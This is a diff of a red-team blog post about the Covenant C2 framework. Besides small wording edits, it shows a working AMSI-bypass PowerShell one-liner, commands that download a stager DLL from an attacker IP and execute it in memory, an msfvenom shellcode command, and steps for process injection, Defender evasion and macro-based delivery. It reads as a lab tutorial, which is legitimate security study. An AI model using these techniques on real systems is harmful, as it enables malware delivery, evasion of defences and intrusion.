@@ -266,9 +266,9 @@ If everything goes fine now you should have your __Grunt__ checking in on __Cove
 __Note:__ Windows Defender real time protection is enabled 🚩
 
 
-Once the modified C# Monkstager has been downloaded and imported into Visual Studio it is possible to add further obfuscation using the following tool from IBM XForce-Red
+Once the modified `C# Monkstager` has been downloaded and imported into __Visual__ __Studio__ it is possible to add further obfuscation using the following tool from IBM XForce-Red
 
-- [InvisibilityCloak:](https://github.com/xforcered/InvisibilityCloak) Obfuscation toolkit for C# post-exploitation tools that perform basics actions for a C# visual studio project.
+- [InvisibilityCloak:](https://github.com/xforcered/InvisibilityCloak) Obfuscation toolkit for C# post-exploitation tools that perform basics actions on project solutions
 
 Alternatively, on the final __.exe__ payload is possible to apply futher string obfuscation using the following tool:
 
@@ -299,7 +299,7 @@ PS > [MonkStager.MonkStager]::Execute()
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov5.JPG">
 </p>
 
-And note your new powershell __Grunt__ checking in on __Covenant__.
+And note your new `powershell` __Grunt__ checking in on __Covenant__.
 
 
 
@@ -317,7 +317,7 @@ On the other hand we can keep our stager entirely in memory by downloading the D
 # Patch Amsi
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
-PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/monk-Avbypass.dll)
+PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/covenant-DLL-noAmsi)
 PS > [System.Reflection.Assembly]::Load($dll)
 PS > [MonkStager.MonkStager]::Execute()
 ```
@@ -330,8 +330,11 @@ However we are not going to dig further around this topic, or at least not for n
 We can try to simulate a campaign conducted by foreign APT adversaries. We will try to leverage the amazing [GadgetToJScript:](https://github.com/med0x2e/GadgetToJScript) project to weaponize our custom .NET assembly.
 Our DLL is not perfect, but it works. However, it's quite hard to deliver one to a target user since no default actions are associated with that file type (double clicking it doesn't do much!). 
 Not to mention that most corporate web proxies and mail filters block the DLL file type regardless of being malicious or benign! 
-What is needed is an additional component that will write our DLL on disk and then load it to trigger the execution. 
-HTA format can be used to facilitate this scenario, but the same concept could be applied with other languages such as VBS and VBA, commonly used for initial enterprise access. This is still the first attack vector used by APT to attack enterprise considering the wide deployment of the Windows office suite.
+
+
+Ideallly, what is needed is an additional component that for example will write our DLL on disk and then load it to trigger the execution. 
+HTA format can be used to facilitate this scenario, but the same concept could be applied with other languages such as VBS and VBA, commonly used for initial enterprise access. 
+Besides phishing campaign this is still the first attack vector used by APT to attack enterprise network considering the wide deployment of the `Windows Office Suite`.
 For this reason we will implement a malicious office with macro enabled. For this simulation we are going to use a simple MessageBox as our payload.
 
 For our basic scenario we will implement the following:
@@ -346,13 +349,13 @@ For our basic scenario we will implement the following:
 
 
 
-Without esitation let's dig into the scenario and let's start by generating a simple non encrypted __msfvenom__ __shellcode__: 
+Without hesitation let's dig into the scenario and let's start by generating a simple non encrypted __msfvenom__ __shellcode__: 
 
 ```powershell
 msfvenom -a x64 -p windows/x64/messagebox Text="Hello from shellcode"  -f csharp
 ```
 
-Moving forward we now need  to store our shellcode into a payload that when executed it will carry out shellcode injection into specific process. 
+Moving forward, we now need to store our shellcode into a payload that when executed will carry out process injection using one of the many and different techniques. 
 
 I decided to use the [QueueUserAPC injection using D/invoke](https://gist.github.com/jfmaes/944991c40fb34625cf72fd33df1682c0) for the process injection part.
 
@@ -364,12 +367,10 @@ This will essentially perform the following:
 - Write shellcode to that memory location
 - Find all threads in explorer.exe
 - Queue an APC to all those threads. APC points to the shellcode
-- Execute the above program
 
 
- 
-Create a default console application in Visual Studio, delete the code and past the code from the gist path. 
-Bear in mind you need to import __D\Invoke__ __package__ from [The Wower](https://twitter.com/therealwover?lang=en). Paste the shellcode from __msfvenom__ and declare
+Create a default __C#__ console application in Visual Studio, delete the code and past the code from the gist path. 
+Bear in mind you need to import __D\Invoke__ __package__ from [The Wower](https://twitter.com/therealwover?lang=en) before compiling the code. Paste the shellcode from __msfvenom__ and declare
 the path of the process which will be used for process injection. In our case we are going to inject into __notepad.exe__
 
  <p align="center">
@@ -403,7 +404,7 @@ Once we have generated our malicious __.js__ file we can execute the file using 
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov7.JPG">
 </p>
 
-If everything went file you should now have your new cscript __Grunt__ checking in on __Covenant__.
+If everything went fine you should now have your new `cscript` __Grunt__ checking in on __Covenant__.
 
 <p align="center">
   <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov8.JPG">
